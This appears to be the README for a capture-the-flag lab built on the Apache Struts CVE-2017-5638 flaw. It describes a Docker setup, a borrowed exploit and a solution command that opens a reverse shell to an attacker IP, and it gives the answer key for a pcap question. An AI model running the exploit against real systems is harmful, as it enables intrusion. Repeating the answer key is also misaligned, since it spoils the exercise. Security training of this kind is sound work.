# Credit Monitoring

Identity theft is not a joke Jim! Millions of families suffer every year... 147 million this time.

## Description

Based on the vulnerability that stole millions of identities - thanks Equifax: https://www.synopsys.com/blogs/software-security/equifax-apache-struts-vulnerability-cve-2017-5638/

Exploit taken from: https://github.com/jrrdev/cve-2017-5638
- Exploit is python2, requires conversion using 2to3. The version within this repo is converted to python3 for easier testing.

Docker image (also linked in repo, same author): https://hub.docker.com/r/jrrdev/cve-2017-5638
- Our docker image leverages jrrdev's Dockerfile to generate *apache-struts.jar*: https://github.com/jrrdev/cve-2017-5638/blob/master/Dockerfile
    - Instead of running the maven builder on each pass, we copy out the resultant jar file, then it's as simple as running our base-image with java8 installed on *service.jar*.

## How to Build

Run:

```
docker compose up --build
```

## Solution

Now spawns a reverse shell.

`./solution <server_ip_address> <attacker_ip_address>` (Example: `./solution.sh 127.0.0.1 172.19.0.1`)

## Static Flag + Solution

Which packet numbers in the attached pcap (*successful_capture.pcapng*) contain shell command input and output? (Comma separated input #,output #)

Answer: 4,10

Packet 4 contains "whoami"
Packet 10 contains "user"
